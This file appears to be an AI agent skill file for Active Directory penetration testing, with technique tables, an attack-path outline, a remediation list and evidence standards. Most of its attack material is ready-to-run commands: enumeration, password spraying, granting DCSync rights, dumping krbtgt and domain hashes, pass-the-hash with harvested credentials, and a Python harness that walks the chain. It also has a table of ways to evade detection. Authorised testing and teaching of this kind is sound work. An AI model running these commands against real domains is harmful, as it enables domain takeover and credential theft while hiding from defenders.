---
name: ad-security
description: Active Directory security testing and attack techniques
tags: [ad, windows, kerberos, ldap, internal-network]
version: "1.0"
---

# Active Directory Security Testing

## Credential Access Techniques

| ID    | Technique              | Tool                     | Description                      |
| ----- | ---------------------- | ------------------------ | -------------------------------- |
| CA-01 | Kerberoasting          | GetUserSPNs.py, Rubeus   | Request TGS for service accounts |
| CA-02 | AS-REP Roasting        | GetNPUsers.py, Rubeus    | Attack accounts without preauth  |
| CA-03 | DCSync                 | secretsdump.py, Mimikatz | Replicate DC credentials         |
| CA-04 | LSASS Dump             | Mimikatz, ProcDump       | Extract credentials from memory  |
| CA-05 | SAM/SYSTEM Dump        | secretsdump.py           | Extract local credentials        |
| CA-06 | NTDS.dit Extraction    | secretsdump.py           | Offline DC credential dump       |
| CA-07 | Cached Credentials     | Mimikatz                 | Extract cached domain creds      |
| CA-08 | DPAPI Secrets          | Mimikatz, SharpDPAPI     | Decrypt protected data           |
| CA-09 | Credential Vault       | Mimikatz                 | Windows credential manager       |
| CA-10 | Browser Credentials    | SharpChromium            | Chrome/Edge saved passwords      |
| CA-11 | LLMNR/NBT-NS Poisoning | Responder                | Capture NTLMv2 hashes            |
| CA-12 | NTLM Relay             | ntlmrelayx.py            | Relay captured authentication    |
| CA-13 | Password Spraying      | Spray, Kerbrute          | Test common passwords            |
| CA-14 | GPP Passwords          | Get-GPPPassword          | Decrypt Group Policy preferences |

## Privilege Escalation Techniques

| ID    | Technique                             | Tool                  | Description                              |
| ----- | ------------------------------------- | --------------------- | ---------------------------------------- |
| PE-01 | ACL Abuse                             | BloodHound, PowerView | WriteDACL, GenericAll abuse              |
| PE-02 | GPO Abuse                             | SharpGPOAbuse         | Modify group policy                      |
| PE-03 | AD CS ESC1                            | Certipy               | Template allows user SAN                 |
| PE-04 | AD CS ESC2                            | Certipy               | Any purpose EKU                          |
| PE-05 | AD CS ESC3                            | Certipy               | Enrollment agent abuse                   |
| PE-06 | AD CS ESC4                            | Certipy               | Template ACL abuse                       |
| PE-07 | AD CS ESC5                            | Certipy               | PKI object access control                |
| PE-08 | AD CS ESC6                            | Certipy               | EDITF_ATTRIBUTESUBJECTALTNAME2           |
| PE-09 | AD CS ESC7                            | Certipy               | CA ACL abuse                             |
| PE-10 | AD CS ESC8                            | Certipy               | NTLM relay to HTTP enrollment            |
| PE-11 | Constrained Delegation                | Rubeus, getST.py      | S4U2Self/S4U2Proxy abuse                 |
| PE-12 | Resource-Based Constrained Delegation | Rubeus                | msDS-AllowedToActOnBehalfOfOtherIdentity |

## Lateral Movement Techniques

| ID    | Technique         | Tool                   | Description                     |
| ----- | ----------------- | ---------------------- | ------------------------------- |
| LM-01 | Pass-the-Hash     | Mimikatz, pth-winexe   | Authenticate with NTLM hash     |
| LM-02 | Pass-the-Ticket   | Rubeus, Mimikatz       | Inject Kerberos tickets         |
| LM-03 | Overpass-the-Hash | Rubeus                 | Request TGT with NTLM hash      |
| LM-04 | PSExec            | Impacket, Sysinternals | Remote execution via SMB        |
| LM-05 | WMI Execution     | wmiexec.py             | Execute commands via WMI        |
| LM-06 | DCOM Execution    | dcomexec.py            | Distributed COM abuse           |
| LM-07 | WinRM             | evil-winrm             | PowerShell remoting             |
| LM-08 | RDP Hijacking     | tscon.exe              | Take over disconnected sessions |
| LM-09 | SMB Relay         | ntlmrelayx.py          | Relay auth to other hosts       |
| LM-10 | SSH (Linux)       | ssh                    | Lateral to Linux systems        |

## Persistence Techniques

| ID    | Technique       | Tool                  | Description                    |
| ----- | --------------- | --------------------- | ------------------------------ |
| PS-01 | Golden Ticket   | Mimikatz, ticketer.py | Forge TGT with KRBTGT hash     |
| PS-02 | Silver Ticket   | Mimikatz, ticketer.py | Forge TGS for specific service |
| PS-03 | Diamond Ticket  | Rubeus                | Modify legitimate TGT          |
| PS-04 | Skeleton Key    | Mimikatz              | Master password on DC          |
| PS-05 | AdminSDHolder   | PowerView             | Persistent admin rights        |
| PS-06 | DCShadow        | Mimikatz              | Rogue domain controller        |
| PS-07 | SID History     | Mimikatz              | Add privileged SID to history  |
| PS-08 | Machine Account | Powermad              | Add computer to domain         |

## Enumeration Commands

### BloodHound Collection

```bash
# SharpHound (Windows)
SharpHound.exe -c All --zipfilename bloodhound.zip

# BloodHound.py (Linux)
bloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1 -c all

# NetExec BloodHound
nxc ldap 10.0.0.1 -u user -p pass --bloodhound --collection All
```

### LDAP Enumeration

```bash
# Get domain info
ldapsearch -x -H ldap://10.0.0.1 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local"

# Find users with SPN (Kerberoastable)
ldapsearch -x -H ldap://10.0.0.1 -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName

# Find users without preauth (AS-REP Roastable)
ldapsearch -x -H ldap://10.0.0.1 -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

### NetExec Commands

```bash
# Enumerate users
nxc smb 10.0.0.1 -u user -p pass --users

# Enumerate groups
nxc smb 10.0.0.1 -u user -p pass --groups

# Find shares
nxc smb 10.0.0.1 -u user -p pass --shares

# Check for admin access
nxc smb 10.0.0.0/24 -u user -p pass

# Password spray
nxc smb 10.0.0.1 -u users.txt -p 'Spring2024!' --no-bruteforce
```

## Attack Paths

### Path 1: Domain User to Domain Admin

```
User Credential
    │
    ├─► Kerberoast SPN accounts
    │   └─► Crack service account password
    │       └─► Service account is Domain Admin
    │
    ├─► BloodHound Path Finding
    │   └─► ACL chain to DA group
    │       └─► WriteDACL → GenericAll → Add to DA
    │
    └─► AD CS Misconfiguration
        └─► ESC1: Request cert as DA
            └─► Authenticate as DA
```

### Path 2: Compromised Workstation to DC

```
Local Admin on Workstation
    │
    ├─► LSASS dump → cached domain creds
    │   └─► Domain user credential
    │       └─► Continue as Path 1
    │
    ├─► Find admin sessions
    │   └─► Lateral move to server
    │       └─► Dump DA credentials
    │
    └─► Unconstrained Delegation
        └─► Coerce DC authentication
            └─► Capture TGT → DCSync
```

## Important Impacket Tools

| Tool           | Purpose                         |
| -------------- | ------------------------------- |
| GetUserSPNs.py | Kerberoasting                   |
| GetNPUsers.py  | AS-REP Roasting                 |
| secretsdump.py | Dump secrets (DCSync, SAM, LSA) |
| smbexec.py     | SMB-based execution             |
| wmiexec.py     | WMI-based execution             |
| psexec.py      | PSExec-style execution          |
| ntlmrelayx.py  | NTLM relay attacks              |
| getST.py       | Request service tickets         |
| ticketer.py    | Create Golden/Silver tickets    |
| lookupsid.py   | SID enumeration                 |
| samrdump.py    | SAM Remote interface dump       |

## Detection Evasion Considerations

| Action        | Detection             | Evasion                      |
| ------------- | --------------------- | ---------------------------- |
| Kerberoasting | 4769 events (RC4)     | Use AES encryption           |
| DCSync        | 4662 events           | Time-based, limit frequency  |
| Pass-the-Hash | 4624 Type 3 with NTLM | Overpass-the-Hash (Kerberos) |
| BloodHound    | LDAP queries          | Reduce collection scope      |
| Mimikatz      | AV signatures         | BOF, custom tools            |

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did an **enumeration query return the object or path** you are reporting? | the exposure exists |
| 2 | Did you **traverse one hop** of the chain with a real action, not a BloodHound edge? | the edge is walkable |
| 3 | Did the action **grant an ability the baseline identity lacked**? | escalation, against a control |
| 4 | Is the endpoint a **privileged object, a DC, or a domain-wide group**? | reach to the top of the domain |
| 5 | Is the **ACE or setting nameable**, so the fix has a target? | remediation is actionable |
| 6 | Did the same chain **fail for the baseline credential**? | causality, not inherited rights |
| 7 | Would this chain still work **after the obvious hardening** (LAPS, Protected Users)? | whether the report is already fixed |

**One walked hop beats ten hypothesised edges.** A BloodHound path from your user to Domain Admins is
a research artefact until you take a real action across at least the first hop and record it.

---

## 10. EXECUTION PRIMITIVES

AD findings are proven by **an authenticated action against the next object in the chain, with a
baseline that fails.** Enumeration produces candidates; only actions produce findings.

### 10.1 Baseline and full collection

```bash
DCIP="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P='Password123!'
# the baseline identity's own reach - the control for every escalation claim
nxc smb "$DCIP" -u "$U" -p "$P" -d "$DOM" --shares -M spider_plus
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --groups
# the full collection, so the path analysis has data
bloodhound-python -u "$U" -p "$P" -d "$DOM" -ns "$DCIP" -c All --zip -o /tmp/bh
unzip -o -q /tmp/bh/*.zip -d /tmp/bh && ls -la /tmp/bh
```

**Capture the baseline's own groups and shares first.** Almost every false positive in AD testing is a
capability the tester already had and mistook for an escalation.

### 10.2 Enumeration commands that produce evidence, not guesses

```bash
# users with an SPN, and users without pre-auth - two different findings, keep them separate
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query   "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName" | head -20
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query   "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"   "sAMAccountName" | head -20
# computers with unconstrained delegation, excluding DCs
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query   "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"   "dNSHostName" | head -20
# and the ACLs on a specific high-value object, which is where most chains actually live
impacket-dacledit -action read -target-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -30
```

**Each query must name the attribute it matched on.** "There are unconstrained delegation hosts" is a
claim; the LDAP filter and the returned `dNSHostName` list is evidence.

### 10.3 Walk one hop, with the control

```bash
# example chain: WriteDACL on a group -> grant yourself membership -> verify membership
# hop 1: prove the permission exists on THIS object for THIS identity
impacket-dacledit -action read -target-dn "CN=Helpdesk,CN=Users,DC=corp,DC=local" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | grep -iE 'writedacl|$U' | head -5
# hop 2: take the action, then read membership back - the read-back is the proof
impacket-dacledit -action write -rights DCSync -target-dn "DC=corp,DC=local" -principal "$U" \
  "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -5
# hop 3: verify the right is now effective by USING it
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-user krbtgt -dc-ip "$DCIP" 2>&1 | head -3
# control: the same secretsdump attempt BEFORE hop 2 must fail
```

**The control is the pre-action attempt.** Recording that `secretsdump` failed before the ACL write and
succeeded after is what turns an ACL observation into an escalation finding.

### 10.4 Attack paths, walked rather than plotted

```bash
# Path 1: domain user to domain admin - test each link in order and stop at the first failure
#   link A: is there a session on a host where I have local admin?
nxc smb 10.0.0.0/24 -u "$U" -p "$P" -d "$DOM" --local-auth 2>/dev/null | grep -i 'Pwn3d' | head -5
#   link B: from a pwned host, harvest and test the next credential
nxc smb 10.0.0.0/24 -u "$U" -p "$P" -d "$DOM" --sam 2>/dev/null | head -5
#   link C: does the harvested credential reach a DA session?
nxc smb 10.0.0.0/24 -u 'HARVESTED' -H 'NT_HASH' -d "$DOM" --loggedon-users 2>/dev/null | grep -i 'admin' | head -5
# Path 2: workstation to DC - the same discipline, one link at a time
impacket-findDelegation "$DOM/$U:$P" -dc-ip "$DCIP" | head -20
```

**Stop at the first failing link and report the chain up to it.** Writing "Path 1 leads to Domain
Admin" without having walked links A through C is the single most common AD report inflation.

### 10.5 The credential-access primitives, each with its evidence

```bash
# DCSync, if the rights are held
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-ntlm -dc-ip "$DCIP" -outputfile /tmp/dc.txt
grep -cE '^[^:]+:[0-9]+:[a-f0-9]{32}' /tmp/dc.txt
# local SAM and LSA secrets on a host where you have admin
nxc smb "$HOST" -u "$U" -p "$P" -d "$DOM" --sam --lsa 2>/dev/null | head -20
# and the proof of a working credential: use it, do not just dump it
nxc smb "$DCIP" -u 'HARVESTED_USER' -H 'NT_HASH' -d "$DOM" --shares
```

**A dump is not a finding; a successful authentication with what was dumped is.** Redact hashes in the
report and reference the artefact path instead.

### 10.6 Persistence and lateral movement, tested and then cleaned

```bash
# each persistence mechanism gets a detection check AND a removal step, in the same block
# 1) GPO abuse - verify the GPO is writable, then verify no malicious setting remains
impacket-dacledit -action read -target-dn "$(nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM"   --query '(objectClass=groupPolicyContainer)' 'distinguishedName' 2>/dev/null | head -1)" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -5
# 2) adminSDHolder - check the ACL, and confirm the reverted state after the operation
impacket-dacledit -action read -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | head -5
# 3) verify your persistence is gone before disengaging
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query "(cn=EVIL*)" "distinguishedName" | head -5
```

**Persistence is only tested when an authorised removal step runs in the same session.** Leaving a
backdoor account or an AdminSDHolder ACL behind is an engagement-integrity failure, not a finding.

### 10.7 A harness that walks the chain and stops

```bash
python3 - <<'PY'
import subprocess,re
DCIP="10.0.0.10"; DOM="corp.local"; U="lowpriv"; P="Password123!"
def sh(name,cmd,pat):
    try: r=subprocess.run(cmd,capture_output=True,text=True,timeout=180); out=r.stdout+r.stderr
    except Exception as e: out=str(e)
    hit=bool(re.search(pat,out,re.I))
    print(f"{name:26} evidence={hit} bytes={len(out)}")
    return hit
chain=[("baseline-shares",["nxc","smb",DCIP,"-u",U,"-p",P,"-d",DOM,"--shares"],r'READ|WRITE'),
       ("ldap-groups",["nxc","ldap",DCIP,"-u",U,"-p",P,"-d",DOM,"--groups"],r'Domain Admins'),
       ("acl-read",["impacket-dacledit","-action","read","-target-dn","DC=corp,DC=local",f"{DOM}/{U}:{P}","-dc-ip",DCIP],r'(WriteDacl|GenericAll|WriteOwner)'),
       ("delegation",["impacket-findDelegation",f"{DOM}/{U}:{P}","-dc-ip",DCIP],r'TRUSTED')]
reached=[]
for n,c,p in chain:
    if sh(n,c,p): reached.append(n)
print()
print("EVIDENCE AT:",reached)
print("Report only these steps, and name the first link that produced NO evidence as the stopping point.")
PY
```

**The harness names the stopping link.** A chain report that omits where it stopped implies the whole
chain succeeded, which is the failure mode this section exists to prevent.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **Baseline identity, its groups, and its reachable shares** | the control every escalation is measured against |
| The **LDAP filter** and the **returned objects** for any enumeration claim | it is checkable by the reader |
| The **ACE, attribute, or GPO** that enables the chain | the fix location |
| The **action taken across the hop**, and the **state read back** | cause and effect |
| The **pre-action failing attempt** | proves escalation |
| The **first failing link**, named | the honest extent of the chain |
| The **authenticated use** of any recovered credential | dump-to-access closure |
| **Detection artefacts** (4662, 5136, 4728, 4672) | the blue-team half |
| Confirmation that **no persistence remains** | engagement integrity |
| Hashes **redacted**, referenced by artefact path | no unnecessary disclosure |

Report the **chain you walked**: "as `lowpriv`, `dacledit` read `WriteDacl` on
`CN=Domain Admins,CN=Users,DC=corp,DC=local` for that account; the write granted `DCSync` at the domain
root; `secretsdump -just-dc-user krbtgt` then succeeded where it had failed before the write; the
effective result is domain-controller-equivalent access for an account that is only a member of
`Domain Users`", never "the domain has ACL misconfigurations".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A BloodHound **path with no hop walked** | a research artefact, not a demonstrated escalation |
| An ACL the baseline **already had** through a group | check the baseline groups first |
| A writable GPO with **no setting that grants access** | hardening only |
| An unconstrained-delegation host that is **a DC** | that is the default and the design |
| A kerberoastable account whose **hash does not crack** | no access results |
| A chain that breaks at hop 2 and is reported as complete | the classic AD inflation |
| Anything obtained with **Domain Admin credentials given in scope** | out of scope for an escalation claim |
| Enumeration output with **no filter stated** | unverifiable |
| A finding against a **lab forest you built** | tests your own build |
| Hashes dumped and pasted **in full** | a disclosure |

**Walk it or drop it.** BloodHound answers "what is possible"; only the action answers "what is true".

---

## 12. REMEDIATION REFERENCE

1. **Tier the administrative model and remove Domain Admin rights from workstation-logged-on accounts** - the credential-reuse path between workstations and the DC is the backbone of nearly every chain.
2. **Prune ACLs on privileged objects down to a documented minimum, and alert on ACE changes there** - ACL-based escalation is a write to a security descriptor, and that write is auditable.
3. **Deploy LAPS or Windows LAPS for machine-local administrator accounts** - unique rotated passwords remove the harvested-hash path.
4. **Add privileged accounts to `Protected Users` and disable credential delegation on them** - it blocks overpass-the-hash and delegation from those accounts.
5. **Rotate `krbtgt` twice with the maximum ticket lifetime between rotations** - it invalidates forged golden tickets.
6. **Restrict `ms-DS-MachineAccountQuota` to 0, and audit RBCD attributes for writes** - RBCD requires a controlled computer account.
7. **Remove unconstrained delegation from every non-DC and enable "Account is sensitive and cannot be delegated" on privileged users** - it removes the coercion-to-DC path.
8. **Restrict `AdminSDHolder` and the `adminCount=1` population, and review its ACL on every privileged-group change** - the inheritance model means one ACL mistake propagates.
9. **Enforce SMB signing, LDAP signing with channel binding, and disable NTLM where possible** - the relay primitives behind coercion attacks need unsigned, unbound targets.
10. **Enable the AD Recycle Bin, and monitor for object recreation and `SIDHistory` writes** - both are persistence mechanisms that survive cleanup.
11. **Alert on `4662` with the replication GUID, `5136` on `nTSecurityDescriptor`, and `4728` for privileged groups** - each maps directly to one of the chains above.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) - the ACE-level exploitation this chains
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) - the protocol-level attacks that end the same chains
- [kerberos-attacks](../kerberos-attacks/SKILL.md) - the flat command reference for those families
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the technique mapping for detection engineering
- [windows-postexploit](../windows-postexploit/SKILL.md) - what happens after a workstation falls
